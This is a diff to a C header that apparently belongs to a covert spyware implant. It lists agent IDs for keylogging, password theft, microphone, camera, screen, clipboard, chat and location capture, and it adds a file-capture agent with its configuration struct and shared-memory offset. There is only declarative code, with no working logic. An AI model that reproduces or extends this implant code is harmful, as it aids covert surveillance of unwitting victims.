@@ -131,7 +131,7 @@ typedef struct os_version {
 #define MAXIDENTIFIERLENGTH 22
 
 // Max seconds to wait for an agent/event stop
-#define MAX_STOP_WAIT_TIME 5
+#define MAX_STOP_WAIT_TIME 10
 
 // Max seconds to wait for an action to trigger (e.g. waiting for a sync end)
 #define MAX_ACTION_WAIT_TIME 60
@@ -171,24 +171,27 @@ extern int gMemLogMaxSize;
 //
 // Agents
 //
-#define AGENT_FILECAPTURE 0x0000
-#define AGENT_KEYLOG      0x0040
-#define AGENT_PRINTER     0x0100
-#define AGENT_VOIP        0x0140
-#define AGENT_URL         0x0180
-#define AGENT_ORGANIZER   0x0200
-#define AGENT_DEVICE      0x0240
-#define AGENT_MOUSE       0x0280
-#define AGENT_EMAIL       0x1001
-#define AGENT_SCREENSHOT  0xB9B9
-#define AGENT_MICROPHONE  0xC2C2
-#define AGENT_CHAT        0xC6C6
-#define AGENT_CRISIS      0xC9C9
-#define AGENT_CLIPBOARD   0xD9D9
-#define AGENT_CAM         0xE9E9
-#define AGENT_PASSWORD    0xFAFA
-#define AGENT_POSITION    0x1220
-#define AGENT_APPLICATION 0x1011
+#define AGENT_FILECAPTURE_OPEN      0x0000 // Log only, but used for configuring the agent
+#define AGENT_FILECAPTURE           0x0001
+#define AGENT_INTERNAL_FILEOPEN     0x0010 // In order to avoid having 0 on shmem->agentID
+#define AGENT_INTERNAL_FILECAPTURE  0x0011
+#define AGENT_KEYLOG                0x0040
+#define AGENT_PRINTER               0x0100
+#define AGENT_VOIP                  0x0140
+#define AGENT_URL                   0x0180
+#define AGENT_ORGANIZER             0x0200
+#define AGENT_DEVICE                0x0240
+#define AGENT_MOUSE                 0x0280
+#define AGENT_EMAIL                 0x1001
+#define AGENT_SCREENSHOT            0xB9B9
+#define AGENT_MICROPHONE            0xC2C2
+#define AGENT_CHAT                  0xC6C6
+#define AGENT_CRISIS                0xC9C9
+#define AGENT_CLIPBOARD             0xD9D9
+#define AGENT_CAM                   0xE9E9
+#define AGENT_PASSWORD              0xFAFA
+#define AGENT_POSITION              0x1220
+#define AGENT_APPLICATION           0x1011
 
 //
 // Agents Shared Memory offsets
@@ -204,6 +207,7 @@ extern int gMemLogMaxSize;
 #define OFFT_COMMAND      0x2040
 #define OFFT_CORE_PID     0x2440
 #define OFFT_APPLICATION  0x2840
+#define OFFT_FILECAPTURE  0x2C40
 
 extern u_int remoteAgents[];
 
@@ -470,13 +474,30 @@ typedef struct _voipConfiguration {
   u_int compression;  // Compression factor
 } voipStruct;
 
+typedef struct _fileConfiguration {
+  u_int minFileSize;
+  u_int maxFileSize;
+  u_int hiMinDate;
+  u_int loMinDate;
+  u_int reserved1;
+  u_int reserved2;
+  BOOL  noFileOpen;
+  u_int acceptCount;
+  u_int denyCount;
+  char patterns[1]; // wchar_t
+} fileStruct;
+
 #pragma mark -
 #pragma mark Log File Header Struct Definition
 #pragma mark -
 
 //
-// First DWORD is not encrypted and specifies: sizeof(logStruct) + deviceIdLen + 
-// userIdLen + sourceIdLen + uAdditionalData
+// First DWORD is not encrypted and specifies:
+// sizeof(logStruct)
+// + deviceIdLen
+// + userIdLen
+// + sourceIdLen
+// + uAdditionalData
 //
 typedef struct _log {
   u_int version;
